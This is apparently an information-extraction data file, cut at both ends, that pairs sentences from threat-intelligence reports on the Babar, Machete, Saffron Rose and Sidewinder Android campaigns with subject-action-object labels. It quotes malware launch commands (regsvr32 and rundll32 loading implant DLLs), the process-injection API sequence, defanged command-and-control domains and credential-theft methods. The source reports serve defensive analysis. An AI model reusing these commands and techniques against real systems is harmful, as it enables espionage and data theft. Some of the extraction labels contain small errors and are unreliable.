               AntiVir\n</list>\n\nBabar also implements an obfuscation technique to hide certain API names": [{"implements": {"A": "implements", "S": "Babar", "O": ["an obfuscation technique", "to hide certain API names"]}}], " The\nimplant is able to hook APIs of interest in dedicated remote processes, to steal data on the fly": [{"steal": {"A": "steal", "S": "The implant", "O": ["on the fly", "data"]}}], " At the same time, the main instance\ncreates six named pipes using the very same GUID": [{"creates": {"A": "creates", "S": "the main instance", "O": ["using the very same GUID", "six named pipes"]}}], " Instance-local capabilities are\nbasic spying on window names or snooping on the clipboard data, while the global hooks manage\nto steal information directly from Windows API calls": [{"steal": {"A": "steal", "S": "the global hooks", "O": ["information", "from Windows API calls"]}}, {"spying": {"A": "spying", "O": ["on window names"]}}], " Then it goes on to load the\nDLL using Windows regsvr32.exe": [{"load": {"A": "load", "S": "it", "O": ["using Windows regsvr32.exe", "the DLL"]}}], " This\nway the malware reduces forensic artefacts, staying behind after infection": [{"reduces": {"A": "reduces", "S": "the malware", "O": ["forensic artefacts"]}}], " At system boot time the regsvr32.exe process will start, load the\nBabar DLL and thus 'deploy' the malware to various legitimate processes": [{"load": {"A": "load", "S": "the regsvr32.exe process", "O": ["At system boot time", "the Babar DLL"]}}], " The steps being taken are:\n\n<list>\n   \u2022   MapViewOfFile \u2013 mapped memory shared with the child instance\n   \u2022   OpenProcess \u2013 obtaining a handle to the chosen victim process\n   \u2022   VirtualAllocEx \u2013 allocate space in remote memory\n   \u2022   WriteProcessMemory \u2013 write function stub to remote memory\n   \u2022   CreateRemoteThread \u2013 execute function stub as remote process\n</list>\n\nThe function stub will then go on to load the Babar DLL through LoadLibraryA and execute one of\nits exports, as indicated in the shared memory": [{"load": {"A": "load", "S": "The function stub", "O": ["through LoadLibraryA", "the Babar DLL"]}, "execute": {"A": "execute", "S": "The function stub", "O": ["one of its exports"]}}], "\n\nAfter infection the dropper executes a separate command line through spawning a cmd.exe\nprocess, which is instructed to wait for 1 second before deleting the dropper binary on disk": [{"deleting": {"A": "deleting", "S": "a cmd.exe process", "O": ["the dropper binary on disk"]}}, {"spawning": {"A": "spawning", "S": "the dropper", "O": ["a cmd.exe process"]}}], " The malware creates an invisible window, with no\nother purpose than to receive window messages": [{"receive": {"A": "receive", "S": "an invisible window", "O": ["window messages"]}}], "\n\nFor inter process communication Babar uses named pipes": [{"uses": {"A": "uses", "S": "Babar", "O": ["named pipes", "For inter process communication"]}}], " Once in\nthe context of a desired target process, the malware goes on to hook specific APIs of interest": [{"hook": {"A": "hook", "S": "the malware", "O": ["specific APIs of interest"]}}], " Babar is able to sniff all keystrokes\nhappening on the same desktop as its invisible window": [{"sniff": {"A": "sniff", "S": "Babar", "O": ["all keystrokes happening on the same desktop as its invisible window"]}}], " Babar operates through multiple instances, by\ninjecting its DLL to a maximum of three desktop processes": [{"injecting": {"A": "injecting", "S": "Babar", "O": ["its DLL", "to a maximum of three desktop processes"]}}], " To achieve this it spawns a dedicated process with the command\nline '\"regsvr32.exe\" /s /n /i \"%APPDATA%\\%DLLNAME%\"'": [{"spawns": {"A": "spawns", "S": "it", "O": ["a dedicated process", "with the command line '\"regsvr32.exe\" /s /n /i \"%APPDATA%\\%DLLNAME%\"'"]}}], "\n\n\n                                                                                         <footer>    page | 12 </footer>\n\fThe data, like all stolen information, is handled by\na separate thread which compresses and encrypts\nit before dumping it to a file on disk": [{"compresses": {"A": "compresses", "S": "a separate thread"}, "encrypts": {"A": "encrypts", "S": "a separate thread"}}], "\n\nDuring this investigation, we also discovered many other the files installing this cyber-espionage tool in\nwhat appears to be a dedicated a spear phishing campaign": [{"installing": {"A": "installing", "S": "many other the files", "O": ["this cyber-espionage tool", "in what appears to be a dedicated a spear phishing campaign"]}}], "\n</section>\n\f\n<section>\n<heading>How does \"Machete\" operate?</heading>\n\nThe malware is distributed via social engineering techniques, which includes spear-phishing emails and\ninfections via Web by a fake Blog website": [{"is distributed": {"A": "is distributed", "O": ["via social engineering techniques", "The malware"]}}], "\n\nThe malware is capable of the following cyber-espionage operations:\n\n<list>\n      Logging keystrokes\n      Capturing audio from the computer's microphone\n      Capturing screenshots\n      Capturing geolocation data\n      Taking photos from the computer's web camera\n      Copying files to a remote server\n      Copying files to a special USB device if inserted\n      Hijjacking the clipboard and capturing information from the target machine\n</list>\n</section>\n\n<section>\n<heading>Targets of \"Machete\"</heading>\n\f\n\n<figure></figure>\n\nMost of the victims are located in, Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, among\nothers": [{"is": {"A": "is", "S": "The malware", "O": ["capable of the following cyber-espionage operations"]}}], "\nThey deliver this malware as a malicious executable          \n(dropper)": [{"deliver": {"A": "deliver", "S": "They", "O": ["this malware", "as a malicious executable (dropper)"]}}], " The\nattackers tailored these login pages for specific                           \ntargets in the DIB and spoofed a variety of services                        \nsuch as Outlook Web Access and VPN login pages": [{"spoofed": {"A": "spoofed", "S": "The attackers", "O": ["a variety of services such as Outlook Web Access and VPN login pages"]}, "tailored": {"A": "tailored", "S": "The attackers", "O": ["for specific targets in the DIB", "these login pages"]}}], " The attackers\nregistered the domain \u201caeroconf2014[.]org\u201d in\norder to impersonate the IEEE Aerospace\nconference\u2014the conference\u2019s actual domain is\naeroconf.org\u2014and sent out an email with the\nfollowing information:\n<list>\nFrom: invite@aeroconf2014[.]org\nSubject: IEEE Aerospace Conference 2014\n</list>\nThe email encouraged users to visit a fake\nconference website owned by the attackers:\n\nUpon visiting the website, visitors were notified\nthat they must install \u201cproxy\u201d software in order to\naccess it, which is actually malware": [{"registered": {"A": "registered", "S": "The attackers", "O": ["the domain \u201caeroconf2014[.]org\u201d", "in order to impersonate the IEEE Aerospace conference"]}, "sent": {"A": "sent", "S": "The attackers", "O": ["out an email with the following information"]}}], " This implant, in turn,\ndrops various other components into C:\\                      \nDocuments and Settings\\{USER}\\Application\nData\\IntelRapidStart\\": [{"drops": {"A": "drops", "S": "This implant", "O": ["various other components", "into C:\\ Documents and Settings\\{USER}\\Application Data\\IntelRapidStart\\"]}}], "                      \n                                                      \nThe first cluster contains the domain used in the     \nAerospace Conference attack as well as the            \ndomains used in phishing attacks designed to          \ncapture user credentials:                             \n                                                      \nThe website used in the Aerospace Conference\nattack was aeroconf2014[.]org, which is registered\nto info@usa.gov[.]us": [{"used": {"A": "used", "O": ["in phishing attacks", "the domains"]}}, {"capture": {"A": "capture", "S": "the domains", "O": ["user credentials"]}}], " We also observed crossover\nwith a sample that connected to both intel-\nupdate[.]com and ultrasms[.]ir, which was\nregistered by lvlr98@gmail[.]com": [{"connected": {"A": "connected", "S": "a sample", "O": ["to both intel- update[.]com and ultrasms[.]ir"]}}], "                            \n</section>\n\n<section>                                                        \n<heading>Victimology</heading>                                             \nDuring our investigation, we were able to recover       \ninformation on 77 victims from one CnC server           \nthat we discovered while analyzing malware              \nsamples that were disguised as anti-censorship          \ntools": [{"were disguised": {"A": "were disguised", "O": ["as anti-censorship tools", "malware samples"]}}], "                      \n                                                                  \nHarvested data is encrypted and written to disk on                \nthe local host": [{"written": {"A": "written", "O": ["on the local host", "Harvested data", "to disk"]}, "is encrypted": {"A": "is encrypted", "O": ["Harvested data"]}}], " We have seen this group                                     \nleverage varied social engineering tactics as a                                 \nmeans to lure their targets into infecting                                      \nthemselves with malware": [{"leverage": {"A": "leverage", "S": "his group", "O": ["varied social engineering tactics"]}, "lure": {"A": "lure", "S": "his group", "O": ["their targets", "into infecting themselves with malware"]}}], " This sample      \n                                                      \n(MD5 1823b77b9ee6296a8b997ffb64d32d21)                \nwas configured to exfiltrate data to ultrasms[.]ir": [{"exfiltrate": {"A": "exfiltrate", "S": "This sample (MD5 1823b77b9ee6296a8b997ffb64d32d21)", "O": ["to ultrasms[.]ir", "data"]}}], "\n  dll creates sqlite3.dll and\n  global atom\n</caption>\n\n<figure></figure>\n\n<caption>\n  Figure 5: IntelRS.exe sleeps\n  until global atom is set and\n  sqlite3.dll is present\n</caption>\n\n<figure></figure>\n\n\n<footer>7 www.fireeye.com</footer>\n\f\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n\nThe Stealer component uses common techniques                      \nto acquire credential data": [{"uses": {"A": "uses", "S": "The Stealer component", "O": ["to acquire credential data", "common techniques"]}}], "\n\n\u2022       288c91d6c0197e99b92c06496921bf2f was\n        bundled with an installer for Proxifier\n        software": [{"was bundled": {"A": "was bundled", "O": ["with an installer for Proxifier software", "288c91d6c0197e99b92c06496921bf2f"]}}], " In\nyears past, Iranian actors primarily committed politically-motivated website defacement\nand DDoS attacks.<fn>1</fn> More recently, however, suspected Iranian actors have destroyed data\non thousands of computers with the Shamoon virus,<fn>2</fn> and they have penetrated the Navy\nMarine Corps Intranet (NMCI), which is used by the U.S": [{"committed": {"A": "committed", "S": "Iranian actors", "O": ["DDoS attacks"]}}, {"destroyed": {"A": "destroyed", "S": "suspected Iranian actors", "O": ["on thousands of computers", "data", "with the Shamoon virus"]}}], " Examples\ninclude:\n\n\u2022       6dc7cc33a3cdcfee6c4edb6c085b869d was\n        bundled with an installer for Ultrasurf Proxy\n        software": [{"was bundled": {"A": "was bundled", "O": ["6dc7cc33a3cdcfee6c4edb6c085b869d", "with an installer for Ultrasurf Proxy software"]}}], "\n</footnote>\n\n\n\n<footer>4 www.fireeye.com</footer>\n\f\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n<section>\n<heading>Credential Phishing</heading>                                                         \nThe attackers have also used phishing attacks, in                           \nwhich they set up Web pages to emulate various                              \nservices that require security credentials": [{"set up": {"A": "set up", "S": "they", "O": ["to emulate various services that require security credentials", "Web pages"]}}, {"used": {"A": "used", "S": "The attackers", "O": ["phishing attacks"]}}], " The user can\n configure the new backdoor to connect to a\n specific CnC server with a personalized username\n and password": [{"connect": {"A": "connect", "S": "the new backdoor", "O": ["to a specific CnC server", "with a personalized username and password"]}}], "\n\nTo counter anti-censorship efforts, Iran has\nattempted to block the use of certain software\ntools.<fn>19</fn> In 2012, researchers found that an\nanti-censorship tool that is primarily used by\nInternet users in Iran was bundled with malware\nand redistributed.<fn>20</fn>\n\nOur investigation found that malware-laden\nversions of legitimate anti-censorship software,\nsuch as Psiphon and Ultrasurf, were distributed to\nusers Iran and Persian speaking people around the\nworld": [{"was bundled": {"A": "was bundled", "O": ["an anti-censorship tool that is primarily used by Internet users in Iran", "with malware"]}}, {"were distributed": {"A": "were distributed", "O": ["to users Iran and Persian speaking people around the world", "malware-laden versions of legitimate anti-censorship software, such as Psiphon and Ultrasurf"]}}], " This\nwas also the email address used to register the\ndomain aerospace2014[.]org, which was used in\nspear phishing attacks against companies in the\nU.S": [{"was used": {"A": "was used", "O": ["in spear phishing attacks against companies in the U.S.", "the domain aerospace2014[.]org"]}}], " There is code to         \nexfiltrate data over HTTP POST as well, but it is       \nunused": [{"exfiltrate": {"A": "exfiltrate", "S": "code", "O": ["over HTTP POST", "data"]}}], " The executable is a CAB extractor that            \ndrops the implant IntelRS.exe": [{"drops": {"A": "drops", "S": "The executable", "O": ["the implant IntelRS.exe"]}}], "\n\n\u2022       3efd971db6fbae08e96535478888cff9 was\n        bundled with an installer for the Psiphon\n        proxy": [{"was bundled": {"A": "was bundled", "O": ["with an installer for the Psiphon proxy", "3efd971db6fbae08e96535478888cff9"]}}], " For instance, it loads                \nvaultcli.DLL and uses various APIs shown below to                 \nacquire RDP accounts from the Windows vault": [{"uses": {"A": "uses", "S": "it", "O": ["to acquire RDP accounts from the Windows vault", "various APIs shown below"]}, "loads": {"A": "loads", "S": "it", "O": ["vaultcli.DLL"]}}], " The attacker can bind the backdoor\n to a legitimate application of his or her choosing, or\n they can cloak it with an icon designed to make the\n backdoor appear as though it is a legitimate file": [{"bind": {"A": "bind", "S": "The attacker", "O": ["to a legitimate application of his or her choosing", "the backdoor"]}}, {"cloak": {"A": "cloak", "S": "they", "O": ["with an icon designed to make the backdoor appear as though it is a legitimate file", "it"]}}], "                \n                                                             \n Upon executing the \u2018Stealer Builder\u2019 the user is            \n presented with an option to load the \u2018Builder\u2019 or to        \n \u2018Decrypt\u2019 logs generated from a victim and                  \n exfiltrated to a command-and-control (CnC) server           \n under the groups\u2019 control": [{"exfiltrated": {"A": "exfiltrated", "O": ["to a command-and-control (CnC) server under the groups\u2019 control", "logs"]}}], "   \n\n\u2022\t    Performs key logging                            \n\n\u2022       Takes various screenshots\n\n\u2022       Harvests instant messaging (IM) account\n        information: GTalk, Pidgin, Yahoo, Skype\n\n\u2022       Tracks credentials, bookmarks and history\n        from major browsers: Chrome, Firefox, Opera\n\n\u2022       Collects email account information\n\n\u2022       Extracts installed proxy software\n        configuration information\n\n\u2022       Harvests data from installed cookies\n</list>\nIntelRS.exe loads a Delphi component called\nDelphiNative.DLL, which implements some\nadditional data theft functionality for the following:\n<list>\n\u2022       Internet Explorer (IE) accounts\n\n\u2022       Remote Desktop Protocol (RDP) accounts\n\n\u2022       Browser URLs\n</list>\n\n<caption>\n  Figure 4: AppTransferWizard": [{"implements": {"A": "implements", "S": "a Delphi component called DelphiNative.DLL", "O": ["some additional data theft functionality", "for the following"]}}, {"loads": {"A": "loads", "S": "IntelRS.exe", "O": ["a Delphi component called DelphiNative.DLL"]}}], " As such,\nwe believe that attackers disguised malware as\nanti-censorship tools in order to target the users of\nsuch tools inside Iran as well as Iranian dissidents\noutside the country": [{"disguised": {"A": "disguised", "S": "attackers", "O": ["malware", "in order to target the users of such tools inside Iran as well as Iranian dissidents outside the country", "as anti-censorship tools"]}}], "\n\n\n<caption>\n  Figure 3: StartBypass\n  Ordinal\n</caption>\n\n<figure></figure>\n\n<footer>6 www.fireeye.com</footer>\n\f\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n\nData exfiltration is conducted over FTP by              \nAppTransferWiz.dll, which acts as an FTP client": [{"is conducted": {"A": "is conducted", "S": "AppTransferWiz.dll", "O": ["Data exfiltration", "over FTP"]}}], "      \n\nOnce the state is set, IntelRS.exe proceeds to          \ncollect data from various areas in the system as        \ndescribed below:                                        \n<list>\n\u2022\t    Collects system information: hostname,          \n      username, timezone, IP addresses, open ports,\n      installed applications, running processes, etc": [{"collect": {"A": "collect", "S": "IntelRS.exe", "O": ["data", "from various areas in the system as described below"]}}], "\n\nFor example, the Ajax Security Team could just be\nusing anti-censorship tools as a lure because they\nare popular in Iran, in order to engage in activities\nthat would be considered traditional cybercrime": [{"be using": {"A": "be using", "S": "the Ajax Security Team", "O": ["anti-censorship tools", "as a lure"]}}], "                             \n                                                                            \nIf users attempt to login through these fake Web                            \npages, the attackers collect their login credentials": [{"collect": {"A": "collect", "S": "the attackers", "O": ["their login credentials"]}}], "\nThese droppers contained icons used in the\nlegitimate installers for these programs": [{"contained": {"A": "contained", "S": "These droppers", "O": ["icons used in the legitimate installers for these programs"]}}], "\n</footnote>\n\n<footer>3 www.fireeye.com</footer>\n\f\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n<section>\n<heading>Attack Vectors</heading>                                                                 \nWe have observed the Ajax Security Team use a                                  \nvariety of vectors to lure targets into installing                             \nmalicious software and/or revealing login                                      \ncredentials": [{"lure": {"A": "lure", "S": "the Ajax Security Team", "O": ["targets", "into installing malicious software and/or revealing login credentials"]}}], "   \nThe majority of the samples we analyzed connect       \nto intel-update[.]com and update-mirror[.]com,        \nwhich were registered by james.mateo@aim[.]com": [{"connect": {"A": "connect", "S": "The majority of the samples we analyzed", "O": ["to intel-update[.]com and update-mirror[.]com"]}}], " These attack vectors include sending                              \nemail, private messages via social media, fake login\npages, and the propagation of anti-censorship                                  \nsoftware that has been infected with malware": [{"include": {"A": "include", "S": "These attack vectors", "O": ["sending email, private messages via social media, fake login pages, and the propagation of anti-censorship software that has been infected with malware"]}}], " For example, the                                \nattackers targeted companies in the DIB using a                                \nfake conference page as a lure to trick targets into                           \ninstalling malicious software": [{"targeted": {"A": "targeted", "S": "the attackers", "O": ["companies in the DIB", "using a fake conference page as a lure to trick targets into installing malicious software"]}}], " The following files are               \nwritten to disk in this location:                            \n\n\n<table>\n                File                                               Functionality\n  IntelRS.exe             Various stealer components and encryption implementation\n  DelphiNative.dll        Browser URL extraction, IE Accounts, RDP accounts (Imported by IntelRS.exe)\n\n\n\n  IntelRS.exe.config      Config containing supported .NET versions for IntelRS.exe\n\n\n  AppTransferWiz.dll      FTP exfiltration (Launched by IntelRS.exe)\n\n\n\n  RapidStartTech.stl      Base64 encoded config block containing FTP credentials, implant name, decoy name, screenshot\n                          interval and booleans for startup, keylogger and screenshot\n</table>\n\nThe IntelRS.exe is written in .NET and is aptly\nnamed \u201cStealer\u201d, as it has various data collection\nmodules": [{"are written": {"A": "are written", "O": ["The following files", "to disk", "in this location"]}}, {"has": {"A": "has", "S": "it", "O": ["various data collection modules"]}}], "                                  \n</section>\n<section>\n<heading>Spear phishing</heading>                                                                 \nDuring our investigation, we discovered that these                             \nattackers sent targeted emails, as well as private\nmessages through social media": [{"sent": {"A": "sent", "S": "these attackers", "O": ["targeted emails, as well as private messages", "through social media"]}}], "\n\n\u2022       3d26442f06b34df3d5921f89bf680ee9 was\n        bundled with an installer for Gerdoovpn\n        virtual private network software": [{"was bundled": {"A": "was bundled", "O": ["with an installer for Gerdoovpn virtual private network software", "3d26442f06b34df3d5921f89bf680ee9"]}}], " We also found incomplete code that would\nperform SFTP and SMTP exfiltration, which could         \nbe completed in a future version": [{"perform": {"A": "perform", "S": "incomplete code", "O": ["SFTP and SMTP exfiltration"]}}], " It drops and launches AppTransferWiz.dll\nvia the following command:\n<list>\n\u201cC:\\WINDOWS\\system32\\rundll32.exe\u201d \u201cC:\\\nDocuments and Settings\\{USER}\\Application\n\nData\\IntelRapidStart\\AppTransferWiz.dll\u201d,#110\n</list>\n110 is an ordinal that corresponds to \u201cStartBypass\u201d\nexport in AppTransferWiz.dll": [{"drops": {"A": "drops", "S": "It"}, "launches": {"A": "launches", "S": "It"}}], "                                                        \n\nAnalysis of the malware indicates that the data is\nencrypted via a Rijndael cipher implementation;\nmore specifically it uses AES which is a specific set\nof configurations of Rijndael": [{"is encrypted": {"A": "is encrypted", "O": ["the data", "via a Rijndael cipher implementation"]}}], " During that time period, the Chinese\nhacking community engaged in website\ndefacements and denial of service attacks in\nconjunction with incidents such as the accidental\nbombing of the Chinese embassy in Belgrade in\n1999, the collision of a U.S": [{"engaged": {"A": "engaged", "S": "the Chinese hacking community", "O": ["in denial of service attacks"]}}], " This                  \nsample is a Stealer variant that connects to the\naforementioned intel-update[.]com as well as            \nplugin-adobe[.]com": [{"connects": {"A": "connects", "S": "This sample", "O": ["to the aforementioned intel-update[.]com as well as plugin-adobe[.]com"]}}], " Other domains\nseen resolving to IP address nearby include the         \nfollowing:                                              \n                                                        \nAside from the sample connecting to plugin-             \nadobe[.]com, we have not discovered any malware\nconnecting to these domains": [{"connecting": {"A": "connecting", "S": "the sample", "O": ["to plugin- adobe[.]com"]}}], " This\nmodel is consistent with the Basij\u2019s recruitment of\nparamilitary volunteer hackers to \u201cengage in less\ncomplex hacking or infiltration operations\u201d leaving\nthe more technical operations to entities over\nwhich they have increasingly direct control.<fn>13</fn>\n\nAs such, the capabilities of threat actors operating\nfrom Iran have traditionally been considered\nlimited.<fn>14</fn> However, the \u201cShamoon\u201d attacks, which\nwiped computers in Saudi Arabia and Qatar,\nindicate an improvement in capabilities.<fn>15</fn> And\nunsurprisingly, Iran has reportedly increased its\nefforts to improve offensive capabilities after\nbeing targeted by Stuxnet and Flame.<fn>16</fn>\n</section>\n\n<footnote>\n5\t   Elegant, S": [{"wiped": {"A": "wiped", "S": "the \u201cShamoon\u201d attacks", "O": ["computers in Saudi Arabia and Qatar"]}}], "                                  \n\n The Builder option enables an attacker to\n configure a new Stealer backdoor": [{"configure": {"A": "configure", "S": "an attacker", "O": ["a new Stealer backdoor"]}}], "                                       \n</section>\n<section>                                                       \n<heading>Spoofed Installers</heading>\nMany of the malicious executables (droppers) that\nwe collected were bundled with legitimate\ninstallers for VPN or proxy software": [{"were bundled": {"A": "were bundled", "O": ["with legitimate installers for VPN or proxy software", "Many of the malicious executables (droppers) that we collected"]}}], "\n\nThese droppers were also designed to visually\nspoof the appearance of the above applications": [{"spoof": {"A": "spoof", "S": "These droppers", "O": ["the appearance of the above applications"]}}], " However, with this information, an                               \nattacker can precisely locate the victim and                                 \nacquire the device\u2019s specifications": [{"locate": {"A": "locate", "S": "an attacker", "O": ["the victim"]}, "acquire": {"A": "acquire", "S": "an attacker", "O": ["the device\u2019s specifications"]}}], "\n\nEven if the attackers can\u2019t obtain root, they can\nattempt ptrace <fn>10</fn> to control the host app": [{"attempt": {"A": "attempt", "S": "they", "O": ["to control the host app", "ptrace"]}}], " Aggressive ad                                    \nlibraries also leak the user\u2019s private information": [{"leak": {"A": "leak", "S": "Aggressive ad libraries", "O": ["the user\u2019s private information"]}}], " As\nshown in Listing 5, an attacker can load\nexecutables compiled from JNI code": [{"load": {"A": "load", "S": "an attacker", "O": ["executables compiled from JNI code"]}}], " root exploits)  16,579          11,706M         4,201         3,207M\n</table>\n</section>  \n\n<footer>14 www.fireeye.com</footer>\n\f\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n<section>\n<heading>Conclusion</heading>\nIn the current golden age of Android ad              \nlibraries, Sidewinder Targeted Attacks can           \ntarget victims using info leakage and other          \nvulnerabilities of ad libraries to get valuable,     \nsensitive information": [{"target": {"A": "target", "S": "Sidewinder Targeted Attacks", "O": ["using info leakage and other vulnerabilities of ad libraries", "victims", "to get valuable, sensitive information"]}}], "\n\nTable 1 proposes different attacks that an\nattacker can launch remotely on target devices\nthrough vulnerable ad libraries": [{"launch": {"A": "launch", "S": "an attacker", "O": ["different attacks", "through vulnerable ad libraries", "remotely", "on target devices"]}}], " The right                      \npanel lists all information stolen from the                       \nvictim\u2019s device": [{"stolen": {"A": "stolen", "O": ["from the victim\u2019s device", "all information"]}}], " If an app containing such                                \nvulnerability has sensitive Android permissions                                  \nsuch as access to the camera, a remote attacker                                  \ncould exploit it to perform sensitive tasks such as                              \ntaking photos or recording video, over the                                       \nInternet, without consent": [{"taking": {"A": "taking", "S": "a remote attacker", "O": ["photos"]}, "recording": {"A": "recording", "S": "a remote attacker", "O": ["video"]}}], "\n</section>\n\n<section>                                                                         \n<heading>Detonation without Android Context</heading>                                       \nAfter getting local access, the attacker can upload                      \nprivate and sensitive files from the victim\u2019s device,                    \nor modify files that the host app can write to (e.g.,                    \nthe directory of the host app and SD Card with                           \nFAT file system)": [{"modify": {"A": "modify", "S": "the attacker", "O": ["files that the host app can write to"]}, "getting": {"A": "getting", "S": "the attacker", "O": ["local access"]}, "upload": {"A": "upload", "S": "the attacker", "O": ["from the victim\u2019s device", "private and sensitive files"]}}], "\n\n</footnote>\n\n\n<footer>7 www.fireeye.com</footer>\n\f\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nTo make calls from the Javascript bridge                                       \nwithout user consent, we can invoke the                                        \ntelephony service to dial numbers directly via                                 \nbinder, as shown in Listing 3, where phone is\nthe remote Android telephony service and the                                   \nnumber 2 represents the second remote call": [{"invoke": {"A": "invoke", "S": "we", "O": ["to dial numbers directly via binder", "the telephony service"]}, "make": {"A": "make", "S": "we", "O": ["calls", "from the Javascript bridge", "without user consent"]}}], "  \n\n</section>\n<section>                                                                \n\n<heading>Clipboard Monitoring nd Tampering</heading>                                             \nWith the Android context, an attacker can                                     \nmonitor or tamper with the clipboard": [{"monitor or tamper": {"A": "monitor or tamper", "S": "an attacker", "O": ["with the clipboard"]}}], " Combined                                    \nwith the launcher modification attack introduced\nearlier, the attackers can redirect other app icons                          \n(e.g., bank or email app icons) to the phishing app                          \nand steal the user\u2019s login credentials": [{"redirect": {"A": "redirect", "S": "the attackers", "O": ["other app icons (e.g., bank or email app icons)", "to the phishing app"]}, "steal": {"A": "steal", "S": "the attackers", "O": ["the user\u2019s login credentials"]}}], "\n19\n</footnote>\n</section>\n\n\n<footer>10 www.fireeye.com</footer>\n\f\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n<section>\n<heading>Stealthy App Installation by Abusing                                         \nCredentials</heading>                                                                  \nWith both the GET ACCOUNTS and the USE                                       \nCREDENTIALS permissions, Android pro- cesses                                 \ncan get secret tokens of services (e.g., Google                              \nservices) from the AccountManager and use them                               \nto authenticate to these services<fn>20</fn>": [{"get": {"A": "get", "S": "Android pro- cesses", "O": ["from the AccountManager", "With both the GET ACCOUNTS and the USE CREDENTIALS permissions", "secret tokens of services (e.g., Google services)"]}, "use": {"A": "use", "S": "Android pro- cesses", "O": ["to authenticate to these services", "them"]}}], "\nAttackers may rent servers close to the target\nservers, and use fake ARP packets to direct all the\ntraffic to go through the hijacking servers first for\nmonitoring and hijacking..ARP hijacking is a\nwell-known approach used in network attacks": [{"use": {"A": "use", "S": "Attackers", "O": ["fake ARP packets", "to direct all the traffic to go through the hijacking servers first for monitoring and hijacking"]}}, {"is": {"A": "is", "S": "ARP hijacking", "O": ["a well-known approach used in network attacks"]}}], " As noted by Google: \u201cUse\nof this method in a WebView containing\nuntrusted content could allow an attacker to\nmanipulate the host application in unintended\nways, executing Java code with the permissions\nof the host application.\u201d<fn>3</fn>\n\nIn particular, if an app running on Android API 16\nor below uses the JavaScript binding method\naddJavascriptInterface and loads the content\nin the WebView over HTTP, an attacker over the\nnetwork could hijack the HTTP traffic (e.g.,\nthrough WiFi or DNS hijacking) to inject\nmalicious content into the WebView and to\ncontrol the host application": [{"executing": {"A": "executing", "S": "an attacker", "O": ["with the permissions of the host application", "Java code"]}, "manipulate": {"A": "manipulate", "S": "an attacker", "O": ["the host application", "in unintended ways"]}}, {"hijack": {"A": "hijack", "S": "an attacker over the network", "O": ["to control the host application", "to inject malicious content into the WebView", "the HTTP traffic", "through WiFi or DNS hijacking"]}}], "\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\f\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker\u2019s                  \napps uploaded to Google Play, etc": [{"sending": {"A": "sending", "S": "the attacker", "O": ["SMS"]}, "implanting": {"A": "implanting", "S": "the attacker", "O": ["bootkit"]}, "dialing": {"A": "dialing", "S": "the attacker", "O": ["numbers"]}, "taking": {"A": "taking", "S": "the attacker", "O": ["pictures"]}, "uploading": {"A": "uploading", "S": "the attacker", "O": ["local files"]}, "installing": {"A": "installing", "S": "the attacker", "O": ["the attacker\u2019s apps uploaded to Google Play"]}, "recording": {"A": "recording", "S": "the attacker", "O": ["audio/video"]}, "manipulating": {"A": "manipulating", "S": "the attacker", "O": ["the clipboard"]}}], " However, if an ad library uses the\n@JavascriptInterface annotation to expose\nsecurity-sensitive interfaces, and uses HTTP to\nload content in the WebView, it is vulnerable to\nattacks where an attacker over the network\ncould inject malicious content into the WebView\nto misuse the interfaces exposed through the JS\nbinding annotation": [{"inject": {"A": "inject", "S": "an attacker over the network", "O": ["into the WebView", "malicious content", "to misuse the interfaces exposed through the JS binding annotation"]}}], " Any UID has the capability                              \nto manipulate clipboard via the API calls in Listing 6:                       \n\n\nUsing these APIs, the attackers can monitor\nchanges to a clipboard and transfer the\nclipboard contents to some remote server": [{"monitor": {"A": "monitor", "S": "the attackers", "O": ["changes to a clipboard"]}, "transfer": {"A": "transfer", "S": "the attackers", "O": ["the clipboard contents", "to some remote server"]}}], " The left panel enables the\nattacker to command the victim's device,\n\n<footnote>\n1\n \t Ranjit Atwal, Lillian Tay, Roberta Cozza, Tuong Huy Nguyen, Tracy Tsai, Annette Zimmermann, and CK Lu": [{"enables": {"A": "enables", "S": "The left panel", "O": ["to command the victim's device", "the attacker"]}}], " Attackers keep a     \nlow profile by allowing all other irrelevant            \nnetwork traffic to pass without being modified": [{"keep": {"A": "keep", "S": "Attackers", "O": ["by allowing all other irrelevant network traffic to pass without being modified", "a low profile"]}}], " If the attackers can hijack                      \nthe communication channels and inject malicious                          \nDEX files, they can then control the behaviors of                        \nthe victim apps": [{"inject": {"A": "inject", "S": "the attackers", "O": ["malicious DEX files"]}, "hijack": {"A": "hijack", "S": "the attackers", "O": ["the communication channels"]}}, {"control": {"A": "control", "S": "they", "O": ["the behaviors of the victim apps"]}}], " For example,\nthe attackers can manipulate Android home                                     \nscreen icons using two normal permissions:                                    \nlauncher READ SETTINGS and WRITE                                              \nSETTINGS permissions": [{"manipulate": {"A": "manipulate", "S": "the attackers", "O": ["using two normal permissions: launcher READ SETTINGS and WRITE SETTINGS permissions", "Android home screen icons"]}}], " Malicious                                    \napps can steal the passwords if they can read                                 \nthe contents on clipboard": [{"steal": {"A": "steal", "S": "Malicious apps", "O": ["the passwords", "if they can read the contents on clipboard"]}}], "\n\nUsing the large-scale traffic intercepted from the\nabove methods, attackers can iden- tify potential\nvictims based on information leakage such as GPS                           \n\n<caption>\n     Figure 4: Number     \n     of ad libraries\n     included in Google            \n     Play apps (with\n     more than 50,000     \n     downloads\n</caption>\n<figure>                          \n                                                                       App Num\n                            25017\n                  20429\n                                       9196\n                                                 4452\n                                                                               2543\n                                                           2343\n                                                                                         1609       1310\n                                                                     1291                                   607   498      980\n                                                                                                          \n           0\n                     0         1         2         3         4         5         6         7          8      9     10      >10\n                          \n</figure>                          \n                          \n                                   \n                          \n                          \n\n\n<footnote>\n\n \t https://isc.sans.edu/diary/Domaincontrol+(GoDaddy)+Nameservers+DNS+ Poisoning+/5146": [{"iden- tify": {"A": "iden- tify", "S": "attackers", "O": ["based on information leakage such as GPS location described in Sec- tion 4.2", "potential victims", "Using the large-scale traffic intercepted from the above methods"]}}], "                              \nBy leveraging all these vulnerabilities, an attacker                             \ncan 